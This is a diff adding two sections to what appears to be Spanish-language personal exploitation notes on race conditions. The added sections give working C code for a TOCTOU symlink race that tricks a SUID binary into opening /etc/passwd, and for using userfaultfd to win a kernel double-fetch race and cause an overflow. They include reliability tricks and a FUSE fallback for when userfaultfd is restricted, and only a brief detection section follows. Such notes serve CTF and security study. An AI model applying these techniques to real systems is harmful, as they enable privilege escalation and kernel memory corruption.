@@ -30,6 +30,50 @@ ese hueco con un objeto controlado:
   ops) -> secuestrar el flujo -> commit_creds ([[kernel-pwn]]).
 - Cuidado con heap quarantine (retrasa la reutilizacion): puede impedir el reclaim rapido.
 
+## Ejemplo: TOCTOU symlink race (userland)
+Un binario SUID valida `access("/tmp/x", W_OK)` y luego `open("/tmp/x")`. Alternas el path
+entre un fichero tuyo (pasa el check) y un symlink a un fichero privilegiado (se usa):
+```c
+// dos hilos apretados: uno hace flip del symlink, otro invoca el binario en bucle.
+#include <unistd.h>
+void *flip(void *_) {
+  for (;;) {                          // pin a un core distinto con sched_setaffinity
+    unlink("/tmp/x"); symlink("/home/me/own", "/tmp/x");   // pasa access()
+    unlink("/tmp/x"); symlink("/etc/passwd", "/tmp/x");    // gana -> open() abre passwd
+  }
+}
+// gana cuando el check cae en 'own' y el use cae en 'passwd'. Repite miles de veces.
+```
+Trucos de fiabilidad: `renameat2(..., RENAME_EXCHANGE)` intercambia dos paths de forma atomica
+(swap fiable sin ventana intermedia), y pinar los hilos en cores separados.
+
+## Ejemplo: ganar un double-fetch con userfaultfd (kernel/CTF)
+En vez de rezar por el timing, BLOQUEAS el segundo fetch: registras la pagina del usuario con
+userfaultfd; cuando el kernel la lee, hace page fault y se para esperandote -> reescribes el
+valor y solo entonces sirves la pagina.
+```c
+// 1) crear uffd y registrar la pagina que el kernel va a re-leer
+long uffd = syscall(SYS_userfaultfd, O_CLOEXEC | O_NONBLOCK);
+struct uffdio_api api = { .api = UFFD_API }; ioctl(uffd, UFFDIO_API, &api);
+struct uffdio_register reg = { .range = { (unsigned long)page, PAGE_SIZE },
+                               .mode = UFFDIO_REGISTER_MODE_MISSING };
+ioctl(uffd, UFFDIO_REGISTER, &reg);
+
+// 2) hilo handler: al primer fetch (fault) el kernel se BLOQUEA aqui.
+void *handler(void *_) {
+  struct uffd_msg msg; struct pollfd p = { uffd, POLLIN, 0 };
+  poll(&p, 1, -1); read(uffd, &msg, sizeof msg);   // llega el fault del 1er fetch
+  ((size_t*)tmp)[0] = HUGE_SIZE;                    // <-- reescribe: pequeno->enorme
+  struct uffdio_copy c = { .dst = msg.arg.pagefault.address & ~0xffful,
+                           .src = (unsigned long)tmp, .len = PAGE_SIZE };
+  ioctl(uffd, UFFDIO_COPY, &c);                     // sirve la pagina -> 2o fetch lee HUGE_SIZE
+  return 0;
+}
+// 3) el syscall/ioctl valida con el valor pequeno (check) y copia con el enorme (use) -> overflow.
+```
+Sin userfaultfd (p.ej. si esta restringido con `unprivileged_userfaultfd=0`): usa FUSE, que
+retrasa la lectura con el mismo efecto de serializacion.
+
 ## Deteccion
 - estatico: mismo puntero de usuario leido dos veces; check y uso separados por una operacion
   que cede CPU (lock, copy, syscall).
